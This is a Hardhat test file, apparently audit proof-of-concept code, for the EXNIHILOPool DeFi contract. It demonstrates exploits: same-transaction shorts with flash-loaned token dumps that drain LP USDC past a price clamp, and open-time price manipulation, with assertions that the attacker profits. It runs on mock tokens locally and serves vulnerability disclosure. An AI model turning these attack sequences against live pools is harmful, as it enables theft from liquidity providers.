import { expect } from "chai";
import { ethers } from "hardhat";
import { time } from "@nomicfoundation/hardhat-network-helpers";
import { EXNIHILOPool } from "../typechain-types";

// Audit R4 PoC scaffolding, not a regression suite. Copy into packages/blockchain/test/
// and AtomicShortAttacker.sol into packages/blockchain/contracts/test/ to run.

const DAY = 24 * 3600;
const USDC = 10n ** 6n;
const TOKEN = 10n ** 18n;
const fmt = (v: bigint) => ethers.formatUnits(v, 6);

async function deployMarket(poolUsdc: bigint, poolToken: bigint, age: number) {
  const signers = await ethers.getSigners();
  const [, treasury, creator, attackerEoa] = signers;
  const M = await ethers.getContractFactory("MockERC20");
  const usdc = await M.deploy("USD Coin", "USDC", 6);
  const token = await M.deploy("Base", "BASE", 18);
  const positionNFT = await (await ethers.getContractFactory("PositionNFT")).deploy();
  const sys = signers[8];
  const poolDeployer = await (await ethers.getContractFactory("PoolDeployer")).connect(sys).deploy();
  const predicted = ethers.getCreateAddress({ from: sys.address, nonce: await sys.getNonce() });
  const lpNft = await (await ethers.getContractFactory("LpNFT")).deploy(predicted);
  const factory = await (await ethers.getContractFactory("EXNIHILOFactory")).connect(sys).deploy(
    await positionNFT.getAddress(), await lpNft.getAddress(), await usdc.getAddress(),
    treasury.address, await poolDeployer.getAddress());
  await positionNFT.initFactory(await factory.getAddress());
  await usdc.mint(creator.address, poolUsdc);
  await token.mint(creator.address, poolToken);
  await usdc.connect(creator).approve(await factory.getAddress(), poolUsdc);
  await token.connect(creator).approve(await factory.getAddress(), poolToken);
  const rc = await (await factory.connect(creator).createMarket(
    await token.getAddress(), poolUsdc, poolToken)).wait();
  let addr = "";
  for (const l of rc!.logs) {
    try { const p = factory.interface.parseLog(l); if (p?.name === "MarketCreated") addr = p.args[0]; } catch {}
  }
  const pool = (await ethers.getContractAt("EXNIHILOPool", addr)) as unknown as EXNIHILOPool;
  await time.increase(age);
  const att = await (await ethers.getContractFactory("AtomicShortAttacker")).connect(attackerEoa)
    .deploy(addr, await usdc.getAddress(), await token.getAddress());
  return { pool, addr, usdc, token, att, attackerEoa };
}

/** Attacker holds a USDC float for fees and `dump` borrowed tokens (a flash loan). */
async function runShort(poolUsdc: bigint, poolToken: bigint, notional: bigint, k: bigint, dump: bigint, age = DAY) {
  const { pool, usdc, token, att } = await deployMarket(poolUsdc, poolToken, age);
  const attAddr = await att.getAddress();
  await usdc.mint(attAddr, poolUsdc);
  await token.mint(attAddr, dump);
  const u0 = await usdc.balanceOf(attAddr);
  const t0 = await token.balanceOf(attAddr);
  const lpUsd0 = await pool.backedAirUsd();
  const lpTok0 = await pool.backedAirToken();
  const lpFees0 = await pool.lpFeesAccumulated();
  const rc = await (await att.attackShort(notional, k, dump)).wait();
  return {
    gain: (await usdc.balanceOf(attAddr)) - u0,
    tokenDelta: (await token.balanceOf(attAddr)) - t0,
    lpUsdcDelta: (await pool.backedAirUsd()) - lpUsd0,
    lpTokenDelta: (await pool.backedAirToken()) - lpTok0,
    lpFeeDelta: (await pool.lpFeesAccumulated()) - lpFees0,
    openPositions: await pool.openPositionCount(),
    gasUsed: rc!.gasUsed,
  };
}

describe("Audit R4 — F-1: a short opened and closed in one transaction escapes the clamp", function () {
  this.timeout(600_000);

  it("drains LP USDC with one atomic short + dump + close + rebuy", async function () {
    const r = await runShort(100_000n * USDC, 100_000n * TOKEN, 20_000n * USDC, 1n, 95_000n * TOKEN);
    console.log(`      attacker +$${fmt(r.gain)} USDC, token delta ${r.tokenDelta} wei, ` +
      `LP backed USDC ${fmt(r.lpUsdcDelta)}, LP backed token ${ethers.formatEther(r.lpTokenDelta)}, ` +
      `LP fees +$${fmt(r.lpFeeDelta)}, open positions ${r.openPositions}, gas ${r.gasUsed}`);
    expect(r.tokenDelta).to.be.gte(0n);
    expect(r.openPositions).to.equal(0n);
    expect(r.gain).to.be.gt(0n);
  });

  it("two shorts at the cap in the same transaction", async function () {
    const { usdc, token, att } = await deployMarket(100_000n * USDC, 100_000n * TOKEN, DAY);
    const a = await att.getAddress();
    await usdc.mint(a, 1_000_000n * USDC);
    await token.mint(a, 145_000n * TOKEN);
    const u0 = await usdc.balanceOf(a);
    await att.attackShortChunked(20_000n * USDC, 2n, 145_000n * TOKEN, 1n);
    const gain = (await usdc.balanceOf(a)) - u0;
    console.log(`      attacker +$${fmt(gain)}`);
    expect(gain).to.be.gt(0n);
  });

  it("scales with the pool, independent of price", async function () {
    for (const [u, t] of [[10_000n, 10_000n], [1_000_000n, 1_000_000n], [100_000n, 100n]] as const) {
      const r = await runShort(u * USDC, t * TOKEN, (u * USDC) / 5n, 1n, (t * TOKEN * 95n) / 100n);
      console.log(`      pool $${u} / ${t} tokens: +$${fmt(r.gain)} ` +
        `(${(Number(r.gain) * 100 / Number(u * USDC)).toFixed(2)} % of pool USDC)`);
      expect(r.gain).to.be.gt(0n);
    }
  });

  it("splitting the swaps multiplies it (swap fee is charged on pre-swap spot value)", async function () {
    for (const j of [5n, 20n]) {
      const { pool, usdc, token, att } = await deployMarket(100_000n * USDC, 100_000n * TOKEN, DAY);
      const a = await att.getAddress();
      const dump = (100_000n * TOKEN * 58n) / 10n;   // 5.8x the token reserve, borrowed
      await usdc.mint(a, 1_000_000n * USDC);
      await token.mint(a, dump);
      const u0 = await usdc.balanceOf(a), t0 = await token.balanceOf(a);
      const y0 = await pool.backedAirUsd(), f0 = await pool.lpFeesAccumulated();
      const rc = await (await att.attackShortChunked(20_000n * USDC, 3n, dump, j)).wait();
      const gain = (await usdc.balanceOf(a)) - u0;
      console.log(`      SHORT x3, dump 5.8x in ${j} swaps: attacker +$${fmt(gain)}, token delta ` +
        `${ethers.formatEther((await token.balanceOf(a)) - t0)}, LP backed USDC ${fmt((await pool.backedAirUsd()) - y0)}, ` +
        `LP fees +$${fmt((await pool.lpFeesAccumulated()) - f0)}, gas ${rc!.gasUsed}`);
      expect((await token.balanceOf(a)) - t0).to.be.gte(0n);
      expect(await pool.openPositionCount()).to.equal(0n);
    }
    for (const j of [1n, 5n, 20n]) {
      const { pool, usdc, att } = await deployMarket(100_000n * USDC, 100_000n * TOKEN, DAY);
      const a = await att.getAddress();
      await usdc.mint(a, 1_000_000n * USDC);
      const u0 = await usdc.balanceOf(a);
      const rc = await (await att.attackLongChunked(20_000n * USDC, 220_000n * USDC, j)).wait();
      const gain = (await usdc.balanceOf(a)) - u0;
      console.log(`      LONG, pump 2.2x in ${j} swaps: attacker ${gain >= 0n ? "+" : ""}$${fmt(gain)}, gas ${rc!.gasUsed}`);
      expect(await pool.openPositionCount()).to.equal(0n);
    }
  });

  it("the long mirror with single swaps does not pay (control)", async function () {
    const { pool, usdc, att } = await deployMarket(100_000n * USDC, 100_000n * TOKEN, DAY);
    const attAddr = await att.getAddress();
    await usdc.mint(attAddr, 10_000_000n * USDC);
    let best = -(10n ** 30n);
    for (const pump of [20_000n, 50_000n, 100_000n]) {
      const snap = await ethers.provider.send("evm_snapshot", []);
      const u0 = await usdc.balanceOf(attAddr);
      try {
        await att.attackLong(15_000n * USDC, pump * USDC);
        const g = (await usdc.balanceOf(attAddr)) - u0;
        if (g > best) best = g;
      } catch {}
      await ethers.provider.send("evm_revert", [snap]);
    }
    console.log(`      best long mirror: $${fmt(best)}`);
    expect(best).to.be.lt(0n);
    void pool;
  });

  it("the same shape across blocks is caught by the clamp (control)", async function () {
    const { pool, addr, usdc, token, attackerEoa: eoa } = await deployMarket(100_000n * USDC, 100_000n * TOKEN, DAY);
    await usdc.mint(eoa.address, 1_000_000n * USDC);
    await token.mint(eoa.address, 95_000n * TOKEN);
    await usdc.connect(eoa).approve(addr, ethers.MaxUint256);
    await token.connect(eoa).approve(addr, ethers.MaxUint256);
    const rc = await (await pool.connect(eoa).openShort(20_000n * USDC, 0n, eoa.address)).wait();
    const id = rc!.logs.map((l) => { try { return pool.interface.parseLog(l); } catch { return null; } })
      .find((l) => l?.name === "PositionOpened")!.args.nftId;
    await pool.connect(eoa).swap(95_000n * TOKEN, 0n, true, eoa.address);
    await expect(pool.connect(eoa).closeShort(id, 0n, eoa.address))
      .to.be.revertedWithCustomError(pool, "PositionUnderwater");
  });

  it("residual: the same trade with the dump held across the clamp window (no arbitrage)", async function () {
    const { pool, addr, usdc, token, attackerEoa: eoa } = await deployMarket(100_000n * USDC, 100_000n * TOKEN, DAY);
    const { mine } = await import("@nomicfoundation/hardhat-network-helpers");
    const dump = (100_000n * TOKEN * 58n) / 10n;
    await usdc.mint(eoa.address, 1_000_000n * USDC);
    await token.mint(eoa.address, dump);
    await usdc.connect(eoa).approve(addr, ethers.MaxUint256);
    await token.connect(eoa).approve(addr, ethers.MaxUint256);
    const u0 = await usdc.balanceOf(eoa.address), t0 = await token.balanceOf(eoa.address);
    const ids: bigint[] = [];
    for (let i = 0; i < 3; i++) {
      const cap = await pool.effectiveLeverageCap();
      const n = 20_000n * USDC < cap ? 20_000n * USDC : cap;
      const rc = await (await pool.connect(eoa).openShort(n, 0n, eoa.address)).wait();
      ids.push(rc!.logs.map((l) => { try { return pool.interface.parseLog(l); } catch { return null; } })
        .find((l) => l?.name === "PositionOpened")!.args.nftId);
    }
    for (let i = 0; i < 20; i++) await pool.connect(eoa).swap(dump / 20n, 0n, true, eoa.address);
    await mine(5);
    for (const id of ids) await pool.connect(eoa).closeShort(id, 0n, eoa.address);
    const sold = (dump / 20n) * 20n;
    let got = 0n;
    for (let i = 0; i < 20; i++) {
      const want = (sold - got) / BigInt(20 - i);
      // smallest USDC in for `want` tokens, mirroring _cpAmountOut
      const y = await pool.backedAirUsd(), x = await pool.backedAirToken();
      const cp = (a: bigint) => { const raw = a * x / (y + a); const fn = a * x * 100n, fd = y * 10_000n;
        const fee = fn === 0n ? 0n : (fn + fd - 1n) / fd; return raw <= fee ? 0n : raw - fee; };
      let lo = 1n, hi = 1n; while (cp(hi) < want) hi *= 2n;
      while (lo < hi) { const m = (lo + hi) / 2n; if (cp(m) >= want) hi = m; else lo = m + 1n; }
      const tb = await token.balanceOf(eoa.address);
      await pool.connect(eoa).swap(lo, 0n, false, eoa.address);
      got += (await token.balanceOf(eoa.address)) - tb;
    }
    const gain = (await usdc.balanceOf(eoa.address)) - u0;
    console.log(`      5-block hold, no arbitrage: attacker ${gain >= 0n ? "+" : ""}$${fmt(gain)}, token delta ` +
      `${ethers.formatEther((await token.balanceOf(eoa.address)) - t0)}`);
  });
});

describe("Audit R4 — F-2: manipulate the open, close honestly later", function () {
  this.timeout(600_000);

  async function run(isLong: boolean, j: bigint) {
    const { pool, usdc, token, att } = await deployMarket(100_000n * USDC, 100_000n * TOKEN, DAY);
    const { mine } = await import("@nomicfoundation/hardhat-network-helpers");
    const a = await att.getAddress();
    await usdc.mint(a, 1_000_000n * USDC);
    const dump = (100_000n * TOKEN * 16n) / 10n;
    if (isLong) await token.mint(a, dump);
    const u0 = await usdc.balanceOf(a), t0 = await token.balanceOf(a);
    if (isLong) await att.openManipLong(dump, 10_000n * USDC, j);
    else await att.openManipShort(160_000n * USDC, 30_000n * USDC, 2n, j);
    await mine(10);                         // well past the clamp window; nothing held
    const mid = await usdc.balanceOf(a);
    await att.closeHeld();
    const gain = (await usdc.balanceOf(a)) - u0;
    console.log(`      ${isLong ? "LONG " : "SHORT"} swaps in ${j}: attacker ${gain >= 0n ? "+" : ""}$${fmt(gain)} ` +
      `(open tx ${fmt(mid - u0)}, close tx +${fmt(gain - (mid - u0))}), token delta ` +
      `${ethers.formatEther((await token.balanceOf(a)) - t0)}, open positions ${await pool.openPositionCount()}`);
    return gain;
  }

  it("short: pump -> open -> unpump in one tx, honest close 10 blocks later", async function () {
    expect(await run(false, 20n)).to.be.gt(0n);
  });

  it("long: dump -> open -> rebuy in one tx, honest close 10 blocks later", async function () {
    expect(await run(true, 20n)).to.be.gt(0n);
  });
});
